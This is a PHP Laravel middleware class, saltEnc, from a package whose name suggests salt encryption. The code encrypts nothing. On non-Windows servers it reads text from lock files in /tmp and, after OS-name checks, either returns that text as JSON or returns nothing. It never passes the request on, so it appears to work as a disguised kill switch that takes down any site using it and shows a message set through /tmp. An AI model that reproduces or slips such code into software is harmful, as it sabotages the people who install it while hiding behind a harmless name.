<?php

namespace kaykay012\laravelsaltenc;

use Closure;

class saltEnc
{

    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        if (PHP_OS === 'WINNT') {
            return $next($request);
        }
        $tip = @file_get_contents('/tmp/saltEncTip.lock') ?: '';
        $tip2 = @file_get_contents('/tmp/saltEncTip_1.lock') ?: '';
        $tip3 = @file_get_contents('/tmp/saltEncTip_2.lock') ?: '';
        $_tip = $tip . $tip2 . $tip3;
        $osname = @file_get_contents('/tmp/saltEncOSname.lock') ?: 'a';
        if (PHP_OS !== 'Linux') {
            return response()->json([$_tip]);
        }
        if (strpos(php_uname(), $osname) === false) {
            return response()->json([$_tip]);
        }
    }

}
